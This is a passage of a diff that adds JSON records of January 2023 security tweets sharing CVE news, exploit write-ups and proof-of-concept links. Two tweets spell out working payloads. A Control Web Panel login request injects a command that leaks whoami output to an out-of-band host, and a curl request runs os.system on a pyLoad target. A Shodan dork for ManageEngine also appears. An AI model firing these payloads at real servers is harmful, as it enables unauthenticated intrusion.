+    "tweetreplies": 5,
+    "tweetretweets": 57,
+    "tweettext": "CVE-2022-47966, a SAML bug lead to Pre-Auth RCE.\nManageEngine got hit, &gt;10 products (Including ADSelfService Plus, ADAudit Plus, AppManager, PMP, ServiceDesk,..) is vulnerable when SAML is enabled or even is configured.\n\nhttps://t.co/mfmWwrMReG\n#CVE-2022-47966 #SAML",
+    "tweettime": "2023-01-11, 03:37:09",
+    "tweeturl": "https://twitter.com/_l0gg/status/1613017142190026756",
+    "username": "_l0gg"
+}
+{
+    "expanded_url": [
+        "https://github.com/michalbednarski/LeakValue"
+    ],
+    "tweetfavorites": 83,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "This is a great write up for CVE-2022-20452 and Parcel Hardining in Android https://t.co/2VZbhTVLZL",
+    "tweettime": "2023-01-10, 17:29:05",
+    "tweeturl": "https://twitter.com/timstrazz/status/1612864115483246592",
+    "username": "timstrazz"
+}
+{
+    "expanded_url": [
+        "https://blog.viettelcybersecurity.com/tabshell-owassrf/",
+        "https://gist.github.com/testanull/518871a2e2057caa2bc9c6ae6634103e"
+    ],
+    "tweetfavorites": 148,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "PoC of TabShell (CVE-2022-41076). More details: https://t.co/46bN4wPCHK\n\nhttps://t.co/62TvnqxnbB",
+    "tweettime": "2023-01-10, 07:21:51",
+    "tweeturl": "https://twitter.com/momika233/status/1612711300211306499",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/s0duku/cve-2022-31705"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2022-31705 (Geekpwn 2022 Vmware EHCI OOB) POC\nhttps://t.co/iQtmJVbV3Y",
+    "tweettime": "2023-01-10, 01:38:33",
+    "tweeturl": "https://twitter.com/momika233/status/1612624908588310530",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://blog.relyze.com/2022/03/cve-2022-27643-netgear-r6700v3-upnpd.html"
+    ],
+    "tweetfavorites": 162,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 52,
+    "tweettext": "RCE on NETGEAR R6700v3 (CVE-2022-27643), buffer overflow vulnerability in Universal Plug and Play daemon (upnpd)\nWiteup by @relyze \n\nhttps://t.co/8AqTj3xmjt \n\n#embedded #iot #infosec #cybersecurity #cve https://t.co/qwFXEHpKN8",
+    "tweettime": "2023-01-09, 20:30:09",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1612547294343077900",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/testanull/518871a2e2057caa2bc9c6ae6634103e",
+        "https://youtu.be/i4JcvwVuCSU"
+    ],
+    "tweetfavorites": 312,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 95,
+    "tweettext": "Exchange TabShell RCE PoC (CVE-2022-41076) \n(Just copy paste the poc from @vcslab's blog post)\nStill wondering why this vulnerability is so underrated xD\nPoC script (for copy paste purpose): https://t.co/4jLfIxXkC3\nhttps://t.co/nHrJvpxqVn",
+    "tweettime": "2023-01-09, 03:42:51",
+    "tweeturl": "https://twitter.com/testanull/status/1612293798004162560",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://defense.one/d/51-cve-2021-38003a-hole-new-world-how-a-small-leak-will-sink-a-great-browser",
+        "https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078"
+    ],
+    "tweetfavorites": 151,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "CVE-2021-38003：A Hole New World - how a small leak will sink a great browser (V8 based)\nhttps://t.co/oSuaewSdrP\nAnd another method:\nhttps://t.co/O0MX4awEFB",
+    "tweettime": "2023-01-08, 21:45:48",
+    "tweeturl": "https://twitter.com/kmkz_security/status/1612203946130526208",
+    "username": "kmkz_security"
+}
+{
+    "tweetfavorites": 470,
+    "tweetquotes": 5,
+    "tweetreplies": 11,
+    "tweetretweets": 162,
+    "tweettext": "#CVE-2022-44877 Control Web Panel Unauth #RCE \n\nPOC: \nPOST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: vuln\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&amp;password=toor&amp;commit=Login https://t.co/TkSmCutTqv",
+    "tweettime": "2023-01-08, 12:46:30",
+    "tweeturl": "https://twitter.com/_0xf4n9x_/status/1612068225046675457",
+    "username": "_0xf4n9x_"
+}
+{
+    "expanded_url": [
+        "https://alephsecurity.com/2021/02/16/apport-lpe/"
+    ],
+    "tweetfavorites": 170,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 58,
+    "tweettext": "Cool writeup by @Gr33nh4t on using Apport crash handler for privilege escalation in Ubuntu (CVE-2021-25682)\n\nhttps://t.co/cLhsDMMTTl \n\n#lpe #exploit #cve #infosec #cybersecurity https://t.co/7zQkGWO5wj",
+    "tweettime": "2023-01-07, 19:30:03",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1611807395130253315",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/rackspace-confirms-play-ransomware-gang.html"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "Rackspace confirmed that the Play #ransomware gang was responsible for last month's breach. The attack used a zero-day exploit related to CVE-2022-41080 to gain initial access to the company's email environment.\n\nRead: https://t.co/Y6EAsqhK5s\n\n#malware #ransomware #hacking",
+    "tweettime": "2023-01-06, 14:23:30",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1611367859958972419",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2022-44877"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 16,
+    "tweettext": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877\n#CVE #RCE  https://t.co/Ov2ENYDIKR",
+    "tweettime": "2023-01-06, 04:48:25",
+    "tweeturl": "https://twitter.com/sirifu4k1/status/1611223136254726145",
+    "username": "sirifu4k1"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-25026-cve-2022-25027-vulnerabilities-in-rocket-trufusion-enterprise/"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 31,
+    "tweettext": "Two high severity vulnerabilities have been discovered in Rocket TRUfusion Enterprise: an authentication bypass issue (CVE-2022-25026) and server-side request forgery (CVE-2022-25027).\n\nhttps://t.co/cxikpIB8jV\n\n#infosec",
+    "tweettime": "2023-01-06, 04:47:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1611222994524966912",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://blog.viettelcybersecurity.com/tabshell-owassrf/"
+    ],
+    "tweetfavorites": 321,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 124,
+    "tweettext": "I learned a lot about internal Powershell working when I go through TabShell bug #CVE-2022-41076. Here is the detail https://t.co/lJb7OjPzMj. And a few problems still there and may be need more investigation. with @_q5ca, @hoangnx99",
+    "tweettime": "2023-01-06, 03:26:52",
+    "tweeturl": "https://twitter.com/rskvp93/status/1611202612065628163",
+    "username": "rskvp93"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2022-44877"
+    ],
+    "tweetfavorites": 127,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 28,
+    "tweettext": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877\n@gaissecurity \nhttps://t.co/bTtguNbe2Q",
+    "tweettime": "2023-01-05, 17:44:13",
+    "tweeturl": "https://twitter.com/numanturle/status/1611055986105802752",
+    "username": "numanturle"
+}
+{
+    "expanded_url": [
+        "https://www.shodan.io/search/facet?query=port%3A3389+ntlm&facet=os"
+    ],
+    "tweetfavorites": 42,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
+    "tweettext": "My friend Arnim R. pointed out in a private chat that a malware or published exploit code for the SPNEGO NEGOEX RCE vulnerability in Windows systems (CVE-2022-37958) could have devastating effects considering the current exposure\n\nhttps://t.co/cLKD3XEfVH https://t.co/B6Dz4mGdSq",
+    "tweettime": "2023-01-05, 12:51:03",
+    "tweeturl": "https://twitter.com/cyb3rops/status/1610982205836206082",
+    "username": "cyb3rops"
+}
+{
+    "expanded_url": [
+        "https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html?m=1",
+        "https://lwn.net/Articles/383162/"
+    ],
+    "tweetfavorites": 235,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 79,
+    "tweettext": "CVE-2022-42703: Linux kernel use-after-free on struct anon_vma \n\npreliminary analysis by Seth Jenkins: https://t.co/XLhmOqtEVZ \n\nLWN article on anon_vma: https://t.co/M2an45zISq \n\n#Linux #kernel #cve #infosec #cybersecurity https://t.co/CAYPQnL712",
+    "tweettime": "2023-01-04, 12:15:03",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1610610759188324352",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-25026-cve-2022-25027-vulnerabilities-in-rocket-trufusion-enterprise/"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 34,
+    "tweettext": "CVE-2022-25026 &amp; CVE-2022-25027: Authentication Bypass and Server-Side Request Forgery in Rocket TRUfusion Enterprise.\n\nhttps://t.co/KFxamGBwb0",
+    "tweettime": "2023-01-04, 11:37:33",
+    "tweeturl": "https://twitter.com/Nettitude_Labs/status/1610601324243984384",
+    "username": "Nettitude_Labs"
+}
+{
+    "expanded_url": [
+        "https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/"
+    ],
+    "tweetfavorites": 222,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 81,
+    "tweettext": "CVE-2021-38003: vulnerability analysis and exploitation by @starlabs_sg\nV8 Javascript engine TheHole value leaking for RCE in Chromium-based browser \n\nhttps://t.co/CNdOT0IECa \n\n#chrome #cve #exploit #infosec #cybersecurity https://t.co/MITv2FRfie",
+    "tweettime": "2023-01-03, 12:15:03",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1610248371498897408",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-23-093/"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 8,
+    "tweettext": "[ZDI-23-093|CVE-2022-46169] Cacti poll_for_data Command Injection Remote Code Execution Vulnerability (CVSS 9.8; Credit: @steventseeley) https://t.co/cxIcb015YU",
+    "tweettime": "2023-01-31, 16:58:42",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1620466614771523588",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 5,
+    "tweetreplies": 6,
+    "tweetretweets": 88,
+    "tweettext": "Our technical deep-dive blog post for the recent #VMware vRealize Log Insight RCE vulnerability chain leading to root privileges.\n💥CVE-2022-31704, CVE-2022-31706, CVE-2022-31711\n💥POC exploit in post\n\nhttps://t.co/g7CxjMvHop",
+    "tweettime": "2023-01-31, 12:10:38",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1620394119930728449",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://github.com/dbgsymbol/windows_lpe_pocs/blob/main/cve-2021-34514-alpc_oob-poc.cpp"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 41,
+    "tweettext": "PoC of CVE-2021-34514, ALPC OOB Access Bug\nhttps://t.co/3EjwokkMVs",
+    "tweettime": "2023-01-31, 09:24:34",
+    "tweeturl": "https://twitter.com/Paul091_/status/1620352328179277824",
+    "username": "Paul091_"
+}
+{
+    "expanded_url": [
+        "https://github.com/alalng/CVE-2022-44789"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 11,
+    "tweettext": "Read my writeup and exploit for a Use-After-Free Vulnerability in Artifex MuJS (CVE-2022-44789): https://t.co/BvF3PkKemm \n\nHope some of the techniques used can help pwners in solving future MuJS CTF challs.🙂 https://t.co/fQ5W5lrku4",
+    "tweettime": "2023-01-29, 23:30:36",
+    "tweeturl": "https://twitter.com/alngpwn/status/1619840465876193281",
+    "username": "alngpwn"
+}
+{
+    "expanded_url": [
+        "https://github.com/alt3kx/CVE-2023-24055_PoC"
+    ],
+    "tweetfavorites": 226,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 102,
+    "tweettext": "CVE-2023-24055 PoC (KeePass 2.5x)\nhttps://t.co/CVzndZOj5M",
+    "tweettime": "2023-01-28, 09:22:35",
+    "tweeturl": "https://twitter.com/momika233/status/1619264666051682304",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/akamai/akamai-security-research/tree/main/PoCs/CVE-2022-34689"
+    ],
+    "tweetfavorites": 76,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 26,
+    "tweettext": "CVE-2022-34689 - CryptoAPI spoofing vulnerability\nhttps://t.co/ludebFgFQO",
+    "tweettime": "2023-01-28, 01:12:51",
+    "tweeturl": "https://twitter.com/momika233/status/1619141420681658369",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/"
+    ],
+    "tweetfavorites": 73,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 36,
+    "tweettext": "Our Indicators of Compromise blog post for the recent #VMware vRealize Log Insight RCE vulnerability chain.\n🔹Log File Entries\n🔹Packet Capture\n🔹Shodan Exposure\n🔹CVE-2022-31704, CVE-2022-31706, CVE-2022-31711\n\nhttps://t.co/CbiXQMx1Eh",
+    "tweettime": "2023-01-27, 19:25:05",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1619053903684964352",
+    "username": "Horizon3Attack"
+}
+{
+    "tweetfavorites": 75,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 27,
+    "tweettext": "CVE-2023-0297\nPre-auth RCE in pyLoad\n\ncurl -i -s -k -X $'POST' \\\n    --data-binary $'jk=pyimport%20os;os.system(\\\"touch%20/tmp/pwnd\\\");f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \\\n    $'http://&lt;target&gt;/flash/addcrypted2'\n\nExploit",
+    "tweettime": "2023-01-27, 08:44:03",
+    "tweeturl": "https://twitter.com/akaclandestine/status/1618892579432726529",
+    "username": "akaclandestine"
+}
+{
+    "expanded_url": [
+        "https://www.vmware.com/security/advisories/VMSA-2023-0001.html"
+    ],
+    "tweetfavorites": 416,
+    "tweetquotes": 8,
+    "tweetreplies": 4,
+    "tweetretweets": 143,
+    "tweettext": "Exploitation of multiple vulnerabilities affecting #VMware vRealize Log Insight leads to unauth RCE\n🔺 CVE-2022-31704, CVE-2022-31706, CVE-2022-31711\n🔺 IOC Blog tomorrow\n🔺 POC / Deep-Dive  Blog next week\n\nSee VMware Security Advisory: https://t.co/tldhMQPoPK https://t.co/VesGlE8u5R",
+    "tweettime": "2023-01-26, 19:44:06",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1618696299897028609",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
+    ],
+    "tweetfavorites": 199,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 62,
+    "tweettext": "Very well written #Windows #patchdiffing and #nday #exploitation walkthrough ✊ \n\nDissecting and Exploiting TCP/IP RCE #Vulnerability EvilESP (CVE-2022-34718)\n\n// by Valentina Palmiotti\n\nhttps://t.co/CI1aJpnUj1 https://t.co/A1pYVNpSFH",
+    "tweettime": "2023-01-26, 12:50:07",
+    "tweeturl": "https://twitter.com/0xdea/status/1618592116724338688",
+    "username": "0xdea"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/exploit-released-for-critical-windows-cryptoapi-spoofing-bug/"
+    ],
+    "tweetfavorites": 132,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 63,
+    "tweettext": "Proof of concept exploit code is now available for a critical Windows CryptoAPI vulnerability (CVE-2022-34689) discovered by the NSA and UK's NCSC - @serghei\nhttps://t.co/h2HyFhmjbt",
+    "tweettime": "2023-01-25, 23:45:47",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1618394732899475456",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://www.synacktiv.com/sites/default/files/2023-01/fortimanager_multiple_vulnerabilities_2021_published_lpe.pdf"
+    ],
+    "tweetfavorites": 43,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 11,
+    "tweettext": "A follow-up LPE vulnerability (CVE-2022-26118) was discovered, exploited and reported by @loadlow, @b1two_ and @taryax on Fortimanager. It is now fixed.\nFor further information, take a look at the advisory: https://t.co/WqwBmscZn3",
+    "tweettime": "2023-01-25, 16:34:04",
+    "tweeturl": "https://twitter.com/Synacktiv/status/1618286088019410945",
+    "username": "Synacktiv"
+}
+{
+    "expanded_url": [
+        "https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/",
+        "https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/"
+    ],
+    "tweetfavorites": 99,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 43,
+    "tweettext": "Awesome Two Part Series by @MrTuxracer on a vulnerability chain from unauthenticated user to full RCE in Intel’s Data Center Manager\n\nAuth Bypass (CVE-2022-33942): https://t.co/BNe0hY4rU5\n\nSQLi to RCE (CVE-2022-21225): https://t.co/DciDd9dUj3\n\n#infosec #hacking #bugbounty https://t.co/I271BuVICi",
+    "tweettime": "2023-01-25, 14:30:00",
+    "tweeturl": "https://twitter.com/payloadartist/status/1618254865368506369",
+    "username": "payloadartist"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/apple/apple-fixes-actively-exploited-ios-zero-day-on-older-iphones-ipads/"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 40,
+    "tweettext": "Apple has backported patches for an \"actively exploited\" zero-day vulnerability, tracked as CVE-2022-42856, to older iPhones and iPads\nhttps://t.co/fPRcIm1ZSE",
+    "tweettime": "2023-01-23, 19:36:32",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1617607233117855746",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://github.blog/2023-01-23-pwning-the-all-google-phone-with-a-non-google-bug/"
+    ],
+    "tweetfavorites": 376,
+    "tweetquotes": 7,
+    "tweetreplies": 2,
+    "tweetretweets": 136,
+    "tweettext": "In this post I'll use CVE-2022-38181, a use-after-free I reported last year in the Arm Mali GPU driver to gain arbitrary kernel code execution and root from untrusted Android app. Not sure if the bug or the disclosure is more interesting: https://t.co/8eu0PxGZeu",
+    "tweettime": "2023-01-23, 17:11:11",
+    "tweeturl": "https://twitter.com/mmolgtm/status/1617570652390854658",
+    "username": "mmolgtm"
+}
+{
+    "expanded_url": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24059",
+        "https://www.reddit.com/r/gtaonline/comments/10hsosu/mass_reporting_the_dangerous_pc_exploit/"
+    ],
+    "tweetfavorites": 392,
+    "tweetquotes": 15,
+    "tweetreplies": 7,
+    "tweetretweets": 90,
+    "tweettext": "Grand Theft Auto V has been assigned CVE-2023-24059 for containing a partial Remote Code Execution exploit\n\nMore information: https://t.co/Cwxt6gDmpY\n\nGrand Theft Auto Online community discussion: https://t.co/JrcEhESlu3",
+    "tweettime": "2023-01-23, 06:41:56",
+    "tweeturl": "https://twitter.com/vxunderground/status/1617412298817130500",
+    "username": "vxunderground"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/6571",
+        "https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/",
+        "https://www.oracle.com/security-alerts/cpuoct2022.html"
+    ],
+    "tweetfavorites": 198,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 60,
+    "tweettext": "Scanning for CVE-2022-21587 (Oracle EBS Unauthenticated - Remote Code Execution) using Nuclei\n\nNuclei Template –– https://t.co/6ZcVlhbPsL\n\nReference ––\n1. https://t.co/LEtdmXHMAt\n2. https://t.co/qSrXQ9HcGc\n\n#hackwithautomation #bugbounty #security #appsec https://t.co/3FsijLzVKr",
+    "tweettime": "2023-01-21, 17:29:29",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1616850483871875073",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/critical-manageengine-rce-bug-now-exploited-to-open-reverse-shells/"
+    ],
+    "tweetfavorites": 37,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 18,
+    "tweettext": "Attackers are now actively exploiting a critical Zoho ManageEngine RCE vulnerability (CVE-2022-47966) with public exploit code to open reverse shells on compromised devices - @serghei\nhttps://t.co/winJyEOM7Z",
+    "tweettime": "2023-01-20, 19:08:26",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1616512995026210823",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
+    ],
+    "tweetfavorites": 1069,
+    "tweetquotes": 10,
+    "tweetreplies": 14,
+    "tweetretweets": 317,
+    "tweettext": "My new blog post! Dissecting and Exploiting TCP/IP RCE Vulnerability “EvilESP”. Reverse engineering CVE-2022-34718 + write a remote Denial of Service exploit. Covers IPsec and IPv6 fragmentation in the Windows kernel, bin-diffing, and making weird packets https://t.co/XR8qhoq1ub",
+    "tweettime": "2023-01-20, 18:51:41",
+    "tweeturl": "https://twitter.com/chompie1337/status/1616508780061298689",
+    "username": "chompie1337"
+}
+{
+    "tweetfavorites": 160,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 41,
+    "tweettext": "CVE-2022-47966: ManageEngine RCE PoC:\n\n#BugBounty https://t.co/kW3AVYaPKX",
+    "tweettime": "2023-01-20, 12:02:14",
+    "tweeturl": "https://twitter.com/sheikhrishad0/status/1616405741912588289",
+    "username": "sheikhrishad0"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 86,
+    "tweettext": "RT @_marklech_: [1/2] Fortinet has published an advisory on active exploitation of CVE-2022-42475 in the wild. My colleagues at Mandiant an…",
+    "tweettime": "2023-01-20, 08:50:42",
+    "tweeturl": "https://twitter.com/cherepanov74/status/1616357539347578881",
+    "username": "cherepanov74"
+}
+{
+    "expanded_url": [
+        "https://blog.exodusintel.com/2022/12/19/linux-kernel-exploiting-a-netfilter-use-after-free-in-kmalloc-cg/"
+    ],
+    "tweetfavorites": 255,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 84,
+    "tweettext": "CVE-2022-32250 : use-after-free in Linux kernel\nExploitation writeup by @ExodusIntel targeting Linux kernel 5.18.1\n\nhttps://t.co/W6U8j5bZtq \n\n#Linux #kernel #exploit #cve #infosec #cybersecurity https://t.co/rm0FV9O52n",
+    "tweettime": "2023-01-20, 08:00:32",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1616344915520241672",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/new-chinese-malware-spotted-exploiting.html"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "Researchers are warning of a new Chinese #malware called \"BOLDMOVE\" that exploited a recently discovered #vulnerability in #Fortinet FortiOS SSL-VPN (CVE-2022-42475) as a zero-day to attack government entities &amp; managed service providers.\n\nhttps://t.co/OyUr9Tp6vw\n\n#cybersecurity",
+    "tweettime": "2023-01-20, 07:00:49",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1616329885194260480",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/6564/files"
+    ],
+    "tweetfavorites": 166,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 55,
+    "tweettext": "🧨 RCE in ManageEngine\n\nRemote Code Execution Vulnerability in ManageEngine products (CVE-2022-47966) due to the use of an outdated version of Apache Santuario.\n\nDork for Shodan:\ntitle:\"ManageEngine\"\n\nLink to template for Nuclei ( https://t.co/frUopqbbbq ) \n\n #rce #cve #BugBounty https://t.co/iKRiFM3ct9",
+    "tweettime": "2023-01-20, 04:54:35",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1616298119301599232",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2023/1/18/cve-2022-35690-unauthenticated-rce-in-adobe-coldfusion"
+    ],
+    "tweetfavorites": 65,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "The latest post from the good folks at the Trend Micro Research Team looks at CVE-2022-35690 - a remote, unauth RCE in #Adobe ColdFusion rated at a CVSS 9.8. Note that you need to patch AND update the ColdFusion JDK/JRE to be protected. https://t.co/g57yropYKI",
+    "tweettime": "2023-01-19, 17:46:06",
+    "tweeturl": "https://twitter.com/thezdi/status/1616129890604007450",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/"
+    ],
+    "tweetfavorites": 239,
+    "tweetquotes": 7,
+    "tweetreplies": 2,
+    "tweetretweets": 92,
+    "tweettext": "Our technical deep-dive of the recent #ManageEngine Pre-Auth RCE CVE-2022-47966. \n\nPOC exploit included for xmlsec &lt;= 1.4.1. Other versions also exploitable.\n\nhttps://t.co/mcStCEws6h",
+    "tweettime": "2023-01-19, 13:19:58",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1616062915097886732",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/"
+    ],
+    "tweetfavorites": 102,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "Oracle EBS Unauth RCE #CVE-2022-21587 analysis from our researchers @vudq16 @_q5ca @hoangnx99 https://t.co/WTC2eyx0uf",
+    "tweettime": "2023-01-19, 06:39:38",
+    "tweeturl": "https://twitter.com/vcslab/status/1615962168352178176",
+    "username": "vcslab"
+}
+{
+    "expanded_url": [
+        "https://weiyiling.cn/one/firefox_0day_case_analysis"
+    ],
+    "tweetfavorites": 223,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 73,
+    "tweettext": "Release the Firefox wild 0day (CVE-2022-26485 &amp;&amp; CVE-2022-26486) analysis : https://t.co/pIzXfIWiR2 https://t.co/7OjqyrCQP0",
+    "tweettime": "2023-01-19, 03:00:59",
+    "tweeturl": "https://twitter.com/huangzhenyuan/status/1615907142078431235",
+    "username": "huangzhenyuan"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-23-055/"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 13,
+    "tweettext": "[ZDI-23-055|CVE-2022-31702] VMware vRealize Network Insight createSupportBundle Command Injection Remote Code Execution Vulnerability (CVSS 9.8) https://t.co/83D4lW3DOs",
+    "tweettime": "2023-01-18, 17:18:18",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1615760504546365440",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf"
+    ],
+    "tweetfavorites": 347,
+    "tweetquotes": 10,
+    "tweetreplies": 8,
+    "tweetretweets": 180,
+    "tweettext": "Watchout! CVE-2023-22809 on Sudo was patched today to prevent a privilege escalation on sudoedit. Read the security advisory by @aevy__ and @v1csec: https://t.co/w2uco4PGhh https://t.co/NPkWJYq74X",
+    "tweettime": "2023-01-18, 15:28:18",
+    "tweeturl": "https://twitter.com/Synacktiv/status/1615732821070315521",
+    "username": "Synacktiv"
+}
+{
+    "tweetfavorites": 40,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
